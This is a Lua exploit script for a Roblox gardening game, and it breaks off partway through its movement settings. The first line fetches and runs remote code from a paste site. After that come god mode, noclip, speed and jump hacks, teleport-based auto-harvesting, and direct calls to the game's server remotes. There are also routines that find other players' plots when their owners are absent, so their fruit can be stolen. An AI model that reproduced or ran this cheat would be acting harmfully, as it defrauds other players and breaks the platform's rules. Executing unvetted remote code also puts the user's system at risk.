local Library = loadstring(game:HttpGet("https://pastefy.app/cEN5rHRd/raw"))()
local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local CS = game:GetService("CollectionService")
local WS = game:GetService("Workspace")
local RunS = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local VU = game:GetService("VirtualUser")
local PhysicsService = game:GetService("PhysicsService")
local plr = Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local hum = char:WaitForChild("Humanoid")
local hrp = char:WaitForChild("HumanoidRootPart")
local Cfg
local function hookgodmode(humanoid)
    humanoid.HealthChanged:Connect(function(h)
        if Cfg and Cfg.GodMode and h < humanoid.MaxHealth then
            humanoid.Health = humanoid.MaxHealth
        end
    end)
    humanoid:GetPropertyChangedSignal("MaxHealth"):Connect(function()
        if Cfg and Cfg.GodMode then
            humanoid.Health = humanoid.MaxHealth
        end
    end)
end
hookgodmode(hum)
plr.CharacterAdded:Connect(function(c)
    char = c
    hum = c:WaitForChild("Humanoid")
    hrp = c:WaitForChild("HumanoidRootPart")
    hookgodmode(hum)
    if Cfg and Cfg.GodMode then
        task.wait(0.1)
        pcall(function() hum.Health = hum.MaxHealth end)
    end
end)
local net = require(RS:WaitForChild("SharedModules"):WaitForChild("Networking"))
local replica = require(RS:WaitForChild("ClientModules"):WaitForChild("ReplicaClient"))
local sync, fvcalc
task.spawn(function()
    local ctrl = plr:WaitForChild("PlayerScripts", 30):WaitForChild("Controllers", 30)
    sync = require(ctrl:WaitForChild("GardenSyncController", 30))
end)
task.spawn(function()
    local sm = RS:WaitForChild("SharedModules", 30)
    local m = sm and sm:WaitForChild("FruitValueCalc", 30)
    if m then pcall(function() fvcalc = require(m) end) end
end)
local state
replica.OnNew("PlayerState", function(r)
    if r.Tags and r.Tags.UserId == plr.UserId then state = r end
end)
replica.RequestData()
local function sheckles()
    return state and state.Data and state.Data.Sheckles or 0
end
local seeds = {
    {n="Carrot", p=1, r="Common"}, {n="Strawberry", p=10, r="Common"},
    {n="Blueberry", p=25, r="Common"}, {n="Tulip", p=40, r="Uncommon"},
    {n="Tomato", p=200, r="Uncommon"}, {n="Apple", p=400, r="Rare"},
    {n="Bamboo", p=700, r="Rare"}, {n="Corn", p=2500, r="Rare"},
    {n="Cactus", p=5000, r="Epic"}, {n="Pineapple", p=10000, r="Epic"},
    {n="Mushroom", p=15000, r="Epic"}, {n="Green Bean", p=20000, r="Legendary"},
    {n="Banana", p=30000, r="Legendary"}, {n="Grape", p=50000, r="Legendary"},
    {n="Coconut", p=70000, r="Legendary"}, {n="Mango", p=85000, r="Legendary"},
    {n="Dragon Fruit", p=120000, r="Mythic"}, {n="Acorn", p=200000, r="Mythic"},
    {n="Cherry", p=250000, r="Mythic"}, {n="Sunflower", p=300000, r="Mythic"},
    {n="Venus Fly Trap", p=400000, r="Mythic"}, {n="Pomegranate", p=2000000, r="Mythic"},
    {n="Poison Apple", p=400000, r="Mythic"}, {n="Moon Bloom", p=7000000, r="Super"},
    {n="Dragon's Breath", p=9000000, r="Super"}, {n="Ghost Pepper", p=2800000, r="Super"},
    {n="Poison Ivy", p=2800000, r="Super"}, {n="Baby Cactus", p=1, r="Secret"},
    {n="Glow Mushroom", p=1, r="Secret"}, {n="Romanesco", p=1, r="Secret"},
    {n="Horned Melon", p=1, r="Secret"},
}
local gears = {
    {n="Common Watering Can", p=2000, r="Common"},
    {n="Common Sprinkler", p=3000, r="Common"},
    {n="Sign", p=4000, r="Common"},
    {n="Lantern", p=12000, r="Rare"},
    {n="Uncommon Sprinkler", p=10000, r="Uncommon"},
    {n="Rare Sprinkler", p=50000, r="Rare"},
    {n="Legendary Sprinkler", p=100000, r="Legendary"},
    {n="Super Sprinkler", p=300000, r="Super"},
    {n="Trowel", p=1000, r="Common"},
    {n="Speed Mushroom", p=1500, r="Common"},
    {n="Jump Mushroom", p=1800, r="Common"},
    {n="Gnome", p=50000, r="Legendary"},
    {n="Shrink Mushroom", p=4500, r="Uncommon"},
    {n="Supersize Mushroom", p=4500, r="Uncommon"},
    {n="Invisibility Mushroom", p=18000, r="Rare"},
    {n="Wheelbarrow", p=500000, r="Super"},
    {n="Teleporter", p=18000, r="Rare"},
    {n="Super Watering Can", p=250000, r="Legendary"},
    {n="Basic Pot", p=60000, r="Legendary"},
    {n="Flashbang", p=8000, r="Rare"},
}
local function fmt(n)
    if n >= 1e9 then return string.format("%.2fB", n/1e9) end
    if n >= 1e6 then return string.format("%.1fM", n/1e6) end
    if n >= 1e3 then return string.format("%.1fK", n/1e3) end
    return tostring(math.floor(n))
end
local seedbyname, gearbyname = {}, {}
for _, s in ipairs(seeds) do seedbyname[s.n] = s end
for _, g in ipairs(gears) do gearbyname[g.n] = g end
local function stocksuffix(q)
    if q <= 0 then return "[no stock]" end
    if q == 1 then return "[1 left]" end
    return ("[%d left]"):format(q)
end
local function seedlabel(s, q) return ("%s  -  %s¢  %s"):format(s.n, fmt(s.p), stocksuffix(q)) end
local function gearlabel(g, q) return ("%s  -  %s¢  %s"):format(g.n, fmt(g.p), stocksuffix(q)) end
local function nameoflabel(lbl)
    return lbl and lbl:match("^(.-)%s%s%-") or nil
end
local seedopts, gearopts = {}, {}
for _, s in ipairs(seeds) do table.insert(seedopts, seedlabel(s, 0)) end
for _, g in ipairs(gears) do table.insert(gearopts, gearlabel(g, 0)) end
local restockkey = { SeedShop = "Seeds", GearShop = "Gear", CrateShop = "Crates", PetShop = "Pets" }
local function getstock(shop, item)
    local sv = RS:FindFirstChild("StockValues")
    if not sv then return 0 end
    local s = sv:FindFirstChild(shop)
    if not s then return 0 end
    local items = s:FindFirstChild("Items")
    if not items then return 0 end
    local v = items:FindFirstChild(item)
    local max = v and v.Value or 0
    local key = restockkey[shop] or shop
    local bought = 0
    if state and state.Data and state.Data.PurchasedThisRestock then
        local p = state.Data.PurchasedThisRestock[key]
        if p then bought = p[item] or 0 end
    end
    return math.max(0, max - bought)
end
local function myplot()
    local gardens = WS:FindFirstChild("Gardens")
    if not gardens then return nil end
    local id = plr:GetAttribute("PlotId")
    if id then
        local p = gardens:FindFirstChild("Plot" .. tostring(id))
        if p then return p end
    end
    for _, g in ipairs(gardens:GetChildren()) do
        if g:GetAttribute("OwnerUserId") == plr.UserId or g:GetAttribute("Owner") == plr.Name then
            return g
        end
    end
    return nil
end
local function tpto(cf)
    if hrp then hrp.CFrame = cf + Vector3.new(0, 3, 0) end
end
local function plotInside(plot)
    if not plot then return nil end
    for _, part in ipairs(plot:GetDescendants()) do
        if part:IsA("BasePart") and (part.Name == "GardenZonePart" or part.Name == "GardenTotalArea" or part.Name == "Move") then
            local groundY = part.Position.Y - part.Size.Y * 0.5 + 3
            return CFrame.new(Vector3.new(part.Position.X, groundY, part.Position.Z))
        end
    end
    for _, part in ipairs(plot:GetDescendants()) do
        if part:IsA("BasePart") and part.Name == "PlotSizeReference" then
            return CFrame.new(part.Position + Vector3.new(0, 3, 0))
        end
    end
    return plotcenter(plot)
end
local function plotcenter(plot)
    if not plot then return nil end
    local imp = plot:FindFirstChild("Important")
    if imp then
        local spawn = imp:FindFirstChild("Plot_Spawn") or imp:FindFirstChild("Spawn")
        if spawn and spawn:IsA("BasePart") then return spawn.CFrame end
    end
    local pp = plot:IsA("Model") and plot.PrimaryPart
    if pp then return pp.CFrame end
    local any = plot:FindFirstChildWhichIsA("BasePart", true)
    return any and any.CFrame or nil
end
local function fruitfromprompt(prompt)
    local node = prompt.Parent
    for _ = 1, 6 do
        if not node then break end
        if node:GetAttribute("FruitId") then return node end
        node = node.Parent
    end
    return nil
end
local function fruitcount()
    if not sync then return 0 end
    local n = 0
    for uid, garden in pairs(sync:GetAllGardens()) do
        if uid == plr.UserId then
            for _, plant in pairs(garden) do
                if plant.Fruits then
                    for _ in pairs(plant.Fruits) do n = n + 1 end
                end
            end
        end
    end
    return n
end
local pets = {
    { n="Bee", r="Rare" }, { n="Black Dragon", r="Mythic" },
    { n="Bunny", r="Common" }, { n="Deer", r="Uncommon" },
    { n="Frog", r="Common" }, { n="Golden Dragonfly", r="Legendary" },
    { n="Ice Serpent", r="Mythic" }, { n="Monkey", r="Rare" },
    { n="Owl", r="Mythic" }, { n="Raccoon", r="Rare" },
    { n="Robin", r="Uncommon" }, { n="Unicorn", r="Mythic" },
}
local petrarityrank = { Common=1, Uncommon=2, Rare=3, Epic=4, Legendary=5, Mythic=6, Super=7, Secret=8 }
local petrarity = {}
for _, p in ipairs(pets) do petrarity[p.n] = p.r end
local eggnames = { "Common Egg", "Test Egg", "Epic Egg" }
local cratenames = {
    "Arch Crate", "Bear Trap Crate", "Bench Crate", "Bridge Crate",
    "Conveyor Crate", "Fence Crate", "Ladder Crate", "Light Crate",
    "Owner Door Crate", "Roleplay Crate", "Sign Crate", "Spring Crate",
    "Teleporter Pad Crate", "Common Guild Crate", "Uncommon Guild Crate",
    "Rare Guild Crate", "Epic Guild Crate", "Legendary Guild Crate",
    "Mythic Guild Crate",
}
local packnames = {
    "Common Seed Pack", "Uncommon Seed Pack", "Rare Seed Pack",
    "Mythic Seed Pack", "Legendary Seed Pack", "Super Seed Pack",
    "Secret Seed Pack", "Ghost Pepper Pack",
}
local raritycol = {
    Common = "rgb(200,200,200)", Uncommon = "rgb(160,255,160)",
    Rare = "rgb(160,200,255)", Epic = "rgb(220,160,255)",
    Legendary = "rgb(255,210,120)", Mythic = "rgb(255,130,255)",
    Super = "rgb(255,100,180)", Secret = "rgb(255,80,80)",
}
local function invof(cat)
    if not (state and state.Data and state.Data.Inventory) then return {} end
    return state.Data.Inventory[cat] or {}
end
local function priceof(inst)
    local p = inst:GetAttribute("Price")
    if p and p > 0 then return p end
    local prompt = inst:FindFirstChildWhichIsA("ProximityPrompt", true)
    if prompt and prompt.ObjectText then
        local found = tonumber((prompt.ObjectText:gsub("[^%d%.]", "")))
        if found then return found end
    end
    return 0
end
local function scanwild()
    local out, seen = {}, {}
    local function pull(folder)
        if not folder then return end
        for _, inst in ipairs(folder:GetChildren()) do
            local petname = inst:GetAttribute("PetName")
            if petname and not seen[inst] then
                seen[inst] = true
                local part = inst:IsA("BasePart") and inst
                    or (inst:IsA("Model") and (inst.PrimaryPart or inst:FindFirstChildWhichIsA("BasePart")))
                local d = (part and hrp) and (part.Position - hrp.Position).Magnitude or -1
                table.insert(out, {
                    name = petname,
                    rarity = inst:GetAttribute("Rarity") or "?",
                    price = priceof(inst),
                    dist = d, inst = inst, part = part,
                })
            end
        end
    end
    local map = WS:FindFirstChild("Map")
    pull(map and map:FindFirstChild("WildPetSpawns"))
    pull(WS:FindFirstChild("WildPetSpawns"))
    pull(WS:FindFirstChild("WildPets"))
    table.sort(out, function(a, b)
        local da = a.dist >= 0 and a.dist or 9e9
        local db = b.dist >= 0 and b.dist or 9e9
        return da < db
    end)
    return out
end
local function isInPlot(character, plot)
    if not (character and plot) then return false end
    local rp = character:FindFirstChild("HumanoidRootPart")
    if not rp then return false end
    for _, part in ipairs(plot:GetDescendants()) do
        if part:IsA("BasePart") and part.Size.Magnitude > 8 then
            local rel = part.CFrame:ToObjectSpace(CFrame.new(rp.Position))
            local hs = part.Size * 0.5
            if math.abs(rel.X) < hs.X + 2 and math.abs(rel.Y) < hs.Y + 8 and math.abs(rel.Z) < hs.Z + 2 then
                return true
            end
        end
    end
    return false
end
local function ownerOnPlot(plot)
    local uid = plot:GetAttribute("OwnerUserId")
    if not uid then return false end
    local owner = Players:GetPlayerByUserId(uid)
    if not owner then return false end
    local oc = owner.Character
    if not oc then return false end
    return isInPlot(oc, plot)
end
local function stealableTargets()
    local out = {}
    local gardens = WS:FindFirstChild("Gardens")
    if not gardens then return out end
    for _, plot in ipairs(gardens:GetChildren()) do
        local uid = plot:GetAttribute("OwnerUserId")
        if uid == plr.UserId then continue end
        if ownerOnPlot(plot) then continue end
        for _, prompt in ipairs(plot:GetDescendants()) do
            if prompt:IsA("ProximityPrompt") then
                local at = prompt.ActionText:lower()
                local ot = prompt.ObjectText:lower()
                if at:find("harvest") or at:find("steal") or at:find("collect") or ot:find("fruit") or CS:HasTag(prompt, "HarvestPrompt") then
                    local fruit = fruitfromprompt(prompt)
                    if fruit then
                        local fuid = fruit:GetAttribute("UserId")
                        if fuid ~= plr.UserId then
                            local part = prompt.Parent
                            local pos = part and part:IsA("BasePart") and part.Position
                            if pos then
                                table.insert(out, { prompt = prompt, pos = pos, plot = plot })
                            end
                        end
                    end
                end
            end
        end
    end
    return out
end
local function intruderInMyPlot()
    local plot = myplot()
    if not plot then return nil end
    for _, op in ipairs(Players:GetPlayers()) do
        if op == plr then continue end
        local oc = op.Character
        if not oc then continue end
        if isInPlot(oc, plot) then return op end
    end
    return nil
end
local function allPlotStatus()
    local out = {}
    local gardens = WS:FindFirstChild("Gardens")
    if not gardens then return out end
    for _, plot in ipairs(gardens:GetChildren()) do
        local uid = plot:GetAttribute("OwnerUserId")
        if not uid or uid == plr.UserId then continue end
        local owner = Players:GetPlayerByUserId(uid)
        local name = owner and owner.Name or ("UID:" .. tostring(uid))
        local onPlot = ownerOnPlot(plot)
        local fruitcount2 = 0
        for _, desc in ipairs(plot:GetDescendants()) do
            if desc:GetAttribute("FruitId") then fruitcount2 += 1 end
        end
        table.insert(out, {
            name = name,
            safe = not onPlot,
            fruits = fruitcount2,
            plot = plot,
        })
    end
    return out
end
Cfg = {
    AutoHarv = false, HarvTp = false, HarvMuts = {}, HarvMutsBL = {}, HarvPlantBL = {},
    AutoPlant = false, PlantSeeds = {},
    AutoSell = false, SellFull = true,
    AntiAFK = true, AutoExp = false, AntiHit = false, AntiLag = false, GodMode = false,
    AutoClaim = false,
    AutoSeedPack = false,
    Noclip = false, InfJump = false,
    SpeedLock = false, SpeedVal = 16,
    JumpLock = false, JumpVal = 50,
    BuySeeds = {}, AutoBuySeed = false,
    BuyGears = {}, AutoBuyGear = false,
    AutoUseGears = false,
    AutoHatch = false, HatchEggs = {},
    AutoCrate = false, OpenCrates = {},
    AutoPack = false, OpenPacks = {},
    AutoEquip = false,
    AutoTameWild = false, WildWatch = {},
    AutoSteal = false,
    StealMuts = {}, StealBank = 20, StolenCount = 0,
    ShovelAura = false,
    AutoDefend = false,
    StealCheck = false,
    FlingAll = false,
    FlingAllTP = false,
    AntiFling = false,
}
local threads = {}
local conns = {}
local lightsv = {}
local antilag_on = false
local function antilagApply()
    if antilag_on then return end
    antilag_on = true
    local lt = game:GetService("Lighting")
    lightsv.gs = lt.GlobalShadows
    lightsv.fe = lt.FogEnd
    lightsv.br = lt.Brightness
    lt.GlobalShadows = false
    lt.FogEnd = 9e9
    for _, e in ipairs(lt:GetChildren()) do
        if e:IsA("BlurEffect") or e:IsA("BloomEffect") or e:IsA("SunRaysEffect")
            or e:IsA("ColorCorrectionEffect") or e:IsA("DepthOfFieldEffect") then
            lightsv[e] = e.Enabled
            e.Enabled = false
        end
    end
    WS.Terrain.WaterWaveSize = 0
    WS.Terrain.WaterWaveSpeed = 0
    WS.Terrain.WaterReflectance = 0
    WS.Terrain.WaterTransparency = 1
    settings().Rendering.QualityLevel = 1
    for _, d in ipairs(WS:GetDescendants()) do
        if d:IsA("ParticleEmitter") or d:IsA("Trail") or d:IsA("Beam") or d:IsA("Smoke")
            or d:IsA("Fire") or d:IsA("Sparkles") or d:IsA("Explosion") then
            lightsv[d] = d.Enabled
            d.Enabled = false
        elseif d:IsA("MeshPart") or d:IsA("Part") then
            if d.Material == Enum.Material.Glass or d.Material == Enum.Material.ForceField then
                d.Material = Enum.Material.SmoothPlastic
            end
        end
    end
end
local function antilagRevert()
    if not antilag_on then return end
    antilag_on = false
    local lt = game:GetService("Lighting")
    if lightsv.gs ~= nil then lt.GlobalShadows = lightsv.gs end
    if lightsv.fe ~= nil then lt.FogEnd = lightsv.fe end
    if lightsv.br ~= nil then lt.Brightness = lightsv.br end
    for k, v in pairs(lightsv) do
        if typeof(k) == "Instance" and k.Parent then
            pcall(function() k.Enabled = v end)
        end
    end
    table.clear(lightsv)
end
local function loop(key, on, fn)
    if threads[key] then
        task.cancel(threads[key])
        threads[key] = nil
    end
    if not on then return end
    threads[key] = task.spawn(function()
        while true do
            pcall(fn)
            task.wait()
        end
    end)
end
local function addsearch(section, dropdown, allitems)
    local Search = section:Textbox({Flag = dropdown.Flag .. "_search", Default = "", Placeholder = "Search...", Finished = false, Callback = function(v)
        v = (v or ""):lower()
        local filtered
        if v == "" then
            filtered = allitems
        else
            filtered = {}
            for _, item in ipairs(allitems) do
                if tostring(item):lower():find(v, 1, true) then
                    table.insert(filtered, item)
                end
            end
        end
        dropdown:Refresh(filtered)
        dropdown.OptionsWithIndexes = {}
        for _, item in ipairs(filtered) do
            if dropdown.Options[item] then
                table.insert(dropdown.OptionsWithIndexes, dropdown.Options[item])
            end
        end
        if dropdown.Multi then
            for _, name in ipairs(dropdown.Value or {}) do
                local opt = dropdown.Options[name]
                if opt and not opt.Selected then
                    opt.Selected = true
                    opt:Toggle("Active")
                end
            end
        else
            if dropdown.Value and dropdown.Options[dropdown.Value] then
                local opt = dropdown.Options[dropdown.Value]
                opt.Selected = true
                opt:Toggle("Active")
            end
        end
    end})
    return Search
end
local statlbl, seedStockHeader, gearStockHeader, wildtxt, seedStockLabels, gearStockLabels, wildSlotLabels
local stealStatusLabels = {}
local stealPlotCursor = 0
local stealInfoLbl, defendLbl, nightLbl
local function isNight()
    local pg = plr:FindFirstChildOfClass("PlayerGui")
    if not pg then return false end
    local ok, result = pcall(function()
        local bar = pg.TeleportButtons.TimeCycleBar.MainFrame:FindFirstChild("Bar")
        if not bar then return false end
        return bar.ImageColor3.B > 0.4
    end)
    return ok and result == true
end
local function stealActive()
    return isNight()
end
local wildcache = {}
do
    local Window = Library:Window({
        Logo = "108551171937093",
        FadeSpeed = 0.15,
        PagePadding = 19,
    })
    local Pages = {
        main = Window:Page({Icon = "leaf", Search = true}),
        shop = Window:Page({Icon = "shopping-cart", Search = true}),
        pets = Window:Page({Icon = "paw-print", Search = true}),
        server = Window:Page({Icon = "server", Search = true}),
        sett = Window:Page({Icon = "settings", Search = true}),
    }
    do
        local Sub = Pages.main:SubPage({Name = "Farm", Icon = "leaf"})
        local Status = Sub:Section({Name = "Status", Icon = "activity", Side = "Left"})
        Status:Label("Live Status:", "Left")
        statlbl = Status:Label("State: idle", "Left")
        local Harv = Sub:Section({Name = "Harvest", Icon = "scissors", Side = "Left"})
        local Plant = Sub:Section({Name = "Plant", Icon = "sprout", Side = "Left"})
        local Sell = Sub:Section({Name = "Sell", Icon = "coins", Side = "Right"})
        local Misc = Sub:Section({Name = "Misc", Icon = "wrench", Side = "Right"})
        Harv:Toggle({Name = "Auto Harvest All", Flag = "autoharv", Default = false, Callback = function(v)
            Cfg.AutoHarv = v
            loop("harv", v, function()
                local mutsel = {}
                for _, mn in ipairs(Cfg.HarvMuts or {}) do mutsel[mn] = true end
                local anymut = next(mutsel) == nil
                local mutbl = {}
                for _, mn in ipairs(Cfg.HarvMutsBL or {}) do mutbl[mn] = true end
                local plantbl = {}
                for _, pn in ipairs(Cfg.HarvPlantBL or {}) do plantbl[pn] = true end
                local prompts = CS:GetTagged("HarvestPrompt")
                local fired = 0
                for _, prompt in ipairs(prompts) do
                    if not Cfg.AutoHarv then break end
                    if not (prompt and prompt.Parent) then continue end
                    local fruit = fruitfromprompt(prompt)
                    if not fruit then continue end
                    local uid = tonumber(fruit:GetAttribute("UserId"))
                    if uid ~= plr.UserId then continue end
                    local plantid = fruit:GetAttribute("PlantId")
                    local fid = fruit:GetAttribute("FruitId")
                    if not (plantid and fid) then continue end
                    local plantname = fruit:GetAttribute("CorePartName")
                    if plantname and plantbl[plantname] then continue end
                    local m = fruit:GetAttribute("Mutation")
                    if m and mutbl[m] then continue end
                    if not anymut then
                        if not (m and mutsel[m]) then continue end
                    end
                    if Cfg.HarvTp and hrp then
                        local part = prompt.Parent
                        local pos = part and part:IsA("BasePart") and part.Position
                            or (fruit:IsA("Model") and fruit.PrimaryPart and fruit.PrimaryPart.Position)
                            or (fruit:IsA("BasePart") and fruit.Position)
                        if pos then
                            hrp.CFrame = CFrame.new(pos)
                            task.wait(0.12)
                        end
                    end
                    pcall(function()
                        if fireproximityprompt then fireproximityprompt(prompt) end
                    end)
                    pcall(function() net.Garden.CollectFruit:Fire(plantid, fid) end)
                    fired = fired + 1
                    task.wait(0.03)
                end
                if fired > 0 then
                    statlbl:SetText("State: harvesting")
                else
                    statlbl:SetText("State: idle")
                end
                task.wait(0.15)
            end)
        end})
        Harv:Toggle({Name = "TP to Each Fruit", Flag = "harvtp", Default = false, Callback = function(v)
            Cfg.HarvTp = v
        end})
        Harv:Dropdown({Name = "Mutations", Flag = "harvmut", Items = {"Gold", "Rainbow", "Electric", "Frozen", "Bloodlit", "Chained", "Starstruck"}, Multi = true, MaxSize = 100, Callback = function(v)
            Cfg.HarvMuts = v or {}
        end})
        Harv:Dropdown({Name = "Blacklist Mutations", Flag = "harvmutbl", Items = {"Gold", "Rainbow", "Electric", "Frozen", "Bloodlit", "Chained", "Starstruck"}, Multi = true, MaxSize = 100, Callback = function(v)
            Cfg.HarvMutsBL = v or {}
        end})
        local harvseednames = {}
        for _, s in ipairs(seeds) do table.insert(harvseednames, s.n) end
        Harv:Dropdown({Name = "Blacklist Plants", Flag = "harvplantbl", Items = harvseednames, Multi = true, MaxSize = 150, Callback = function(v)
            Cfg.HarvPlantBL = v or {}
        end})
        local plantseednames = {}
        for _, s in ipairs(seeds) do table.insert(plantseednames, s.n) end
        Plant:Dropdown({Name = "Seeds to Plant", Flag = "plantseeds", Items = plantseednames, Multi = true, MaxSize = 150, Callback = function(v)
            Cfg.PlantSeeds = v or {}
        end})
        Plant:Toggle({Name = "Auto Plant Inventory", Flag = "autoplant", Default = false, Callback = function(v)
            Cfg.AutoPlant = v
            if v then
                threads["plant"] = task.spawn(function()
                    local plantcursor = 0
                    local function plantareas(plot)
                        local out = {}
                        for _, p in ipairs(CS:GetTagged("PlantArea")) do
                            if p:IsDescendantOf(plot) and p:IsA("BasePart") then
                                table.insert(out, p)
                            end
                        end
                        return out
                    end
                    local function spotson(part, step)
                        step = step or 6
                        local out = {}
                        local sz = part.Size
                        local hx, hz = sz.X * 0.5 - 2, sz.Z * 0.5 - 2
                        if hx < 1 or hz < 1 then
                            table.insert(out, part.CFrame.Position + Vector3.new(0, sz.Y * 0.5 + 1, 0))
                            return out
                        end
                        for x = -hx, hx, step do
                            for z = -hz, hz, step do
                                local pos = part.CFrame:PointToWorldSpace(Vector3.new(x, sz.Y * 0.5 + 1, z))
                                table.insert(out, pos)
                            end
                        end
                        return out
                    end
                    local function seedtools()
                        local sel = {}
                        for _, n in ipairs(Cfg.PlantSeeds or {}) do sel[n] = true end
                        local any = next(sel) == nil
                        local out = {}
                        local bp = plr:FindFirstChildOfClass("Backpack")
                        if bp then
                            for _, t in ipairs(bp:GetChildren()) do
                                if t:IsA("Tool") and t:GetAttribute("SeedTool") then
                                    if any or sel[t:GetAttribute("SeedTool")] then table.insert(out, t) end
                                end
                            end
                        end
                        if char then
                            for _, t in ipairs(char:GetChildren()) do
                                if t:IsA("Tool") and t:GetAttribute("SeedTool") then
                                    if any or sel[t:GetAttribute("SeedTool")] then table.insert(out, t) end
                                end
                            end
                        end
                        return out
                    end
                    local function equip(tool)
                        if not (tool and tool.Parent) then return end
                        if tool.Parent == char then return end
                        if hum then pcall(function() hum:EquipTool(tool) end) end
                    end
                    local function allspots(plot)
                        local out = {}
                        for _, area in ipairs(plantareas(plot)) do
                            for _, p in ipairs(spotson(area, 5)) do table.insert(out, p) end
                        end
                        return out
                    end
                    local function plantedhere(plot, pos)
                        local plants = plot:FindFirstChild("Plants")
                        if not plants then return false end
                        for _, p in ipairs(plants:GetChildren()) do
                            local part = p:IsA("Model") and (p.PrimaryPart or p:FindFirstChildWhichIsA("BasePart"))
                                or (p:IsA("BasePart") and p)
                            if part then
                                local d = (Vector2.new(part.Position.X, part.Position.Z) - Vector2.new(pos.X, pos.Z)).Magnitude
                                if d < 3 then return true end
                            end
                        end
                        return false
                    end
                    while Cfg.AutoPlant do
                        local plot = myplot()
                        if not plot then
                            statlbl:SetText("State: idle")
                            task.wait(1) continue
                        end
                        local spots = allspots(plot)
                        local tools = seedtools()
                        if #spots == 0 or #tools == 0 then
                            statlbl:SetText("State: idle")
                            task.wait(2) continue
                        end
                        local planted = false
                        for _, tool in ipairs(tools) do
                            if not Cfg.AutoPlant then break end
                            local seedname = tool:GetAttribute("SeedTool")
                            if not seedname then continue end
                            equip(tool)
                            task.wait(0.15)
                            local tries = 0
                            while tries < #spots do
                                if not Cfg.AutoPlant then break end
                                if not tool.Parent then break end
                                plantcursor = (plantcursor % #spots) + 1
                                local target = spots[plantcursor]
                                tries = tries + 1
                                if target and not plantedhere(plot, target) then
                                    if not planted then
                                        statlbl:SetText("State: planting")
                                        planted = true
                                    end
                                    if hrp then
                                        hrp.CFrame = CFrame.new(target + Vector3.new(0, 3, 0))
                                        task.wait(0.08)
                                    end
                                    pcall(function() net.Plant.PlantSeed:Fire(target, seedname, tool) end)
                                    task.wait(0.2)
                                    break
                                end
                            end
                        end
                        if not planted then statlbl:SetText("State: idle") end
                        task.wait(0.2)
                    end
                    statlbl:SetText("State: idle")
                end)
            else
                if threads["plant"] then task.cancel(threads["plant"]) threads["plant"] = nil end
            end
        end})
        Sell:Toggle({Name = "Auto Sell", Flag = "autosell", Default = false, Callback = function(v)
            Cfg.AutoSell = v
            if v then
                threads["sell"] = task.spawn(function()
                    while Cfg.AutoSell do
                        local cnt = plr:GetAttribute("FruitCount") or 0
                        local max = plr:GetAttribute("MaxFruitCapacity") or 100
                        local shouldsell = (not Cfg.SellFull and cnt > 0) or (Cfg.SellFull and cnt >= max)
                        if shouldsell then
                            statlbl:SetText("State: selling")
                            pcall(function() net.NPCS.SellAll:Fire() end)
                            task.wait(1.5)
                            statlbl:SetText("State: idle")
                        end
                        task.wait(1.5)
                    end
                end)
            else
                if threads["sell"] then task.cancel(threads["sell"]) threads["sell"] = nil end
            end
        end})
        Sell:Toggle({Name = "Only Sell When Full", Flag = "sellfull", Default = true, Callback = function(v)
            Cfg.SellFull = v
        end})
        Sell:Button({Name = "Sell All Now", Callback = function()
            pcall(function() net.NPCS.SellAll:Fire() end)
        end})
        Misc:Toggle({Name = "Anti-AFK", Flag = "antiafk", Default = true, Callback = function(v)
            Cfg.AntiAFK = v
        end})
        Misc:Toggle({Name = "Anti-Hit", Flag = "antihit", Default = false, Callback = function(v)
            Cfg.AntiHit = v
        end})
        Misc:Toggle({Name = "Anti Damage", Flag = "godmode", Default = false, Callback = function(v)
            Cfg.GodMode = v
            if v and hum then
                pcall(function() hum.Health = hum.MaxHealth end)
            end
        end})
        Misc:Toggle({Name = "Anti-Lag (kill FX)", Flag = "antilag", Default = false, Callback = function(v)
            Cfg.AntiLag = v
            if v then antilagApply() else antilagRevert() end
        end})
        Misc:Toggle({Name = "Auto Expand Garden", Flag = "autoexp", Default = false, Callback = function(v)
            Cfg.AutoExp = v
            loop("expand", v, function()
                local ok, res = pcall(function() return net.Actions.ExpandGarden:Fire() end)
                if not ok or res == false then task.wait(15) end
                task.wait(3)
            end)
        end})
        Misc:Toggle({Name = "Auto Claim Mailbox", Flag = "autoclaim", Default = false, Callback = function(v)
            Cfg.AutoClaim = v
            loop("claim", v, function()
                local ok, list = pcall(function() return net.Mailbox.List:Fire() end)
                if ok and type(list) == "table" then
                    for _, m in pairs(list) do
                        if type(m) == "table" and m.Id then
                            pcall(function() net.Mailbox.Claim:Fire(m.Id) end)
                        end
                    end
                end
                task.wait(60)
            end)
        end})
        Misc:Toggle({Name = "Auto Collect Gold Seeds", Flag = "autoseedpack", Default = false, Callback = function(v)
            Cfg.AutoSeedPack = v
            loop("seedpack", v, function()
                local folder = WS:FindFirstChild("Map")
                folder = folder and folder:FindFirstChild("SeedPackSpawnServerLocations")
                if not folder then task.wait(0.5) return end
                local found = 0
                for _, part in ipairs(folder:GetChildren()) do
                    if not Cfg.AutoSeedPack then break end
                    local prompt = part:FindFirstChildWhichIsA("ProximityPrompt", true)
                    if prompt and prompt.Parent then
                        local target = part:IsA("BasePart") and part
                            or part:FindFirstChildWhichIsA("BasePart", true)
                        if target and hrp then
                            hrp.CFrame = CFrame.new(target.Position + Vector3.new(0, 2, 0))
                        end
                        pcall(function()
                            if fireproximityprompt then
                                fireproximityprompt(prompt, 0, true)
                            end
                        end)
                        found += 1
                    end
                end
                if found > 0 then
                    statlbl:SetText(("State: collecting gold seeds (%d)"):format(found))
                end
                task.wait(0.5)
            end)
        end})
    end
    do
        local Sub = Pages.main:SubPage({Name = "Movement", Icon = "move"})
        local Move = Sub:Section({Name = "Movement", Icon = "move", Side = "Left"})
        local TP = Sub:Section({Name = "Teleports", Icon = "rocket", Side = "Right"})
        Move:Toggle({Name = "Noclip", Flag = "noclip", Default = false, Callback = function(v)
            Cfg.Noclip = v
        end})
        Move:Toggle({Name = "Infinite Jump", Flag = "infjump", Default = false, Callback = function(v)
            Cfg.InfJump = v
        end})
        Move:Toggle({Name = "WalkSpeed", Flag = "speedlock", Default = false, Callback = function(v)
            Cfg.SpeedLock = v
            if not v and hum then hum.WalkSpeed = 16 end
        end})
        Move:Slider({Name = "Speed", Flag = "speedval", Min = 16, Max = 200, Default = 16, Decimals = 1, Callback = function(v)
            Cfg.SpeedVal = v
        end})
        Move:Toggle({Name = "JumpPower", Flag = "jumplock", Default = false, Callback = function(v)
            Cfg.JumpLock = v
            if not v and hum then hum.JumpPower = 50 end
        end})
        Move:Slider({Name = "Power", Flag = "jumpval", Min = 50, Max = 300, Default = 50, Decimals = 1, Callback = function(v)
            Cfg.JumpVal = v
        end})
